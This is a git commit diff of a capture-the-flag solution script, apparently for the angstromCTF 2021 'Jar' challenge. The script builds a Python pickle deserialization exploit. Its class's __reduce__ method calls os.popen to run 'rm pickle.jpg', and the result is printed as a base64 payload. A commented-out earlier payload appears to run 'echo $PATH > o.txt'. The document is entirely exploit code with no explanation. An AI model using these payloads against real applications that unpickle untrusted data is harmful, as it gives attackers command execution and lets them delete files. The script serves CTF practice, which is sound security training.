ec16789baefe1623d933d6513ddcef165700a13c
Vincent550102 <5020559@gmail.com>
2021-04-05 17:26:10 +0800

    upd

--- Team/angstromctf/angstromctf2021/Jar/sol.py
+++ Team/angstromctf/angstromctf2021/Jar/sol.py
@@ -1,4 +1,23 @@
+'''
 import pickle
 import base64
-tmp = pickle.loads(base64.b64decode('gASVIgAAAAAAAABdlCiMA2FzZJSMA2FzZJSMA2FhYZSMBGZsYWeUjAF5lGUu=='))
+byte = base64.b64decode('gASVKQAAAAAAAACMAm9zlIwFcG9wZW6Uk5SMEmVjaG8gJFBBVEggPiBvLnR4dJSFlFKULg==')
+print(byte)
+tmp = pickle.loads(byte)
 print(tmp)
+'''
+
+import pickle
+import base64
+
+
+class MMM(object):
+    def __reduce__(self):
+        import os
+        s = "rm pickle.jpg"
+        return (os.popen, (s,))
+
+payload = pickle.dumps(MMM())
+load = base64.b64encode(payload)
+print(load)
+
